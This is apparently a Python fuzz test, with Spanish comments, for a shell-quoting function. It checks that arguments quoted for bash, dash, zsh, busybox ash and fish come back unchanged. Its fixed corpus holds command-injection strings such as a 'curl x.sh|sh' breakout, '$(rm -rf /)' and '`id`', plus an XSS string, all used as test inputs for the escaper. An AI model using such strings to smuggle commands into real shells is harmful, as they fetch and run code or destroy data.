import random, subprocess, sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from shquote import build, shquote

HERE = os.path.dirname(os.path.abspath(__file__))
# El «programa remoto» es un script de sh y no Python: así lo lanza el propio
# shell que se prueba sin cruzar a otro mundo de procesos. En Windows (MSYS),
# un python.exe recibía el argv recompuesto por MSYS y la prueba medía eso, no
# el shell. Es el mismo impresor que usa tests/escapado.rs.
PRINTER = os.path.join(HERE, "printargv.sh")
if os.name == "nt":
    PRINTER = PRINTER.replace("\\", "/")

# Obligatorios: si falta uno, la prueba no da verde (una suite que se salta un
# shell afirma algo que no ha probado). Con --solo-presentes se omiten los que
# falten, diciéndolo, para poder correrla en una máquina de desarrollo.
SHELLS = [("bash", ["bash", "-c"]), ("dash", ["dash", "-c"]),
          ("zsh", ["zsh", "-c"]), ("busybox-ash", ["busybox", "sh", "-c"])]
# fish no es POSIX y es justo por eso que está: dentro de comillas simples lee
# \' y \\ como escapes. Opcional porque no viene en ninguna imagen base; si no
# está, se dice en voz alta.
OPCIONALES = [("fish", ["fish", "--no-config", "-c"])]

# Alfabeto adversario: exactamente lo que rompe un escapado hecho a mano.
ALPHABET = list("abcXY019 \t'\"\\$`;&|<>()[]{}*?~!#^%=+,.:/-\n") + \
           ["á", "ñ", "€", "🚀", "\u202e", "\u2028", "\u200b", "\u00a0"]

CORPUS = [
    [""], ["a"], ["hola mundo"], ["'"], ['"'], ["\\"], ["$HOME"], ["`id`"],
    ["a'; curl x.sh|sh; '"], ["--json"], ["--"], ["-rf"], ["~"], ["*"],
    ["a\nb"], ["a\tb"], ["</script><img src=x onerror=alert(1)>"],
    ["produccion\u202egnitset-"], ["a" * 65536], ["ñandú"], ["🚀"],
    ["$(rm -rf /)"], ["${IFS}"], ["!!"], ["^x^y"], ["a\u2028b"], ["  "],
    # Las rupturas de fish: con la barra dentro de las comillas, la primera
    # ejecutaba `id`, la segunda perdía una barra y la tercera no cerraba.
    ["\\'; id #"], ["a\\\\b"], ["abc\\"], ["\\'"], ["'\\'"], ["\\\\'\\\\"],
    ["/usr/local/bin/orbit", "deploy", "mi-web", "--json"],
    ["/usr/local/bin/orbit", "exec", "web", "psql 'select 1'"],
]


def hay(shell_cmd):
    # Se le ejecuta algo, no se le pregunta si existe.
    try:
        r = subprocess.run(shell_cmd + ["exit 0"], capture_output=True)
        return r.returncode == 0
    except OSError:
        return False


def roundtrip(shell_cmd, argv):
    line = build(["sh", PRINTER] + argv)
    if os.name == "nt":
        # En Windows la línea no cruza bien como argumento: CreateProcess la
        # aplana y MSYS la vuelve a partir con sus reglas, que comen barras
        # invertidas (`'a'\\'b'` llegaba como `'a'\'b'`). Eso mide a MSYS, no
        # al shell, así que la línea va en un fichero que el shell lee con el
        # mismo analizador que `-c`. En Linux sigue por `-c`, que es lo que
        # hace sshd.
        import tempfile
        with tempfile.NamedTemporaryFile("wb", suffix=".sh", delete=False) as f:
            f.write(line.encode("utf-8", "surrogateescape"))
        try:
            r = subprocess.run(shell_cmd[:-1] + [f.name.replace("\\", "/")],
                               capture_output=True)
        finally:
            os.unlink(f.name)
    else:
        r = subprocess.run(shell_cmd + [line], capture_output=True)
    if r.returncode != 0:
        return None, r.stderr.decode("utf-8", "replace")[:200]
    got = r.stdout.decode("utf-8", "surrogateescape").split("\x00")
    got.pop()  # el separador final deja un elemento vacío
    return got, None


def sin_barra_dentro_de_comillas(cases):
    # La propiedad que cierra la ruptura de fish, sin shells de por medio:
    # ningún tramo entre comillas simples lleva una barra invertida.
    malos = []
    for argv in cases:
        for a in argv:
            q, i = shquote(a), 0
            while i < len(q):
                if q[i] == "\\":
                    i += 2  # fuera de comillas: \' o \\
                elif q[i] == "'":
                    j = q.index("'", i + 1)
                    if "\\" in q[i + 1:j]:
                        malos.append((a, q))
                    i = j + 1
                else:
                    i += 1
    return malos


def run(n_random, seed, solo_presentes):
    rnd = random.Random(seed)
    cases = list(CORPUS)
    for _ in range(n_random):
        k = rnd.randint(1, 5)
        cases.append(["".join(rnd.choice(ALPHABET) for _ in range(rnd.randint(0, 24)))
                      for _ in range(k)])
    fails = [("pura", a, "barra dentro de comillas: " + q)
             for a, q in sin_barra_dentro_de_comillas(cases)]
    probados = []
    for name, sc in SHELLS + OPCIONALES:
        if not hay(sc):
            if (name, sc) in OPCIONALES:
                print("  %-12s OMITIDO: no está instalado (opcional)" % name)
            elif solo_presentes:
                print("  %-12s OMITIDO: no está instalado (--solo-presentes)" % name)
            else:
                fails.append((name, [], "no está instalado: la propiedad no está probada"))
            continue
        ok = 0
        for argv in cases:
            got, err = roundtrip(sc, argv)
            if got is None:
                fails.append((name, argv, "shell error: " + err)); continue
            if got != argv:
                fails.append((name, argv, "devolvió %r" % (got,)))
            else:
                ok += 1
        print("  %-12s %d/%d" % (name, ok, len(cases)))
        probados.append(name)
    return fails, len(cases), probados


if __name__ == "__main__":
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    solo_presentes = "--solo-presentes" in sys.argv[1:]
    seed = int(args[0]) if len(args) > 0 else 20260830
    n = int(args[1]) if len(args) > 1 else 2500
    print("semilla=%d  casos aleatorios=%d  + %d fijos" % (seed, n, len(CORPUS)))
    fails, total, probados = run(n, seed, solo_presentes)
    print("total por shell: %d casos; shells probados: %s" % (total, ", ".join(probados) or "ninguno"))
    if fails or not probados:
        print("FALLOS: %d" % len(fails))
        for f in fails[:10]:
            print("  ", f[0], repr(f[1])[:120], "->", f[2][:160])
        sys.exit(1)
    print("PROPIEDAD SOSTENIDA: argv -> escapar -> shell -> argv es la identidad")
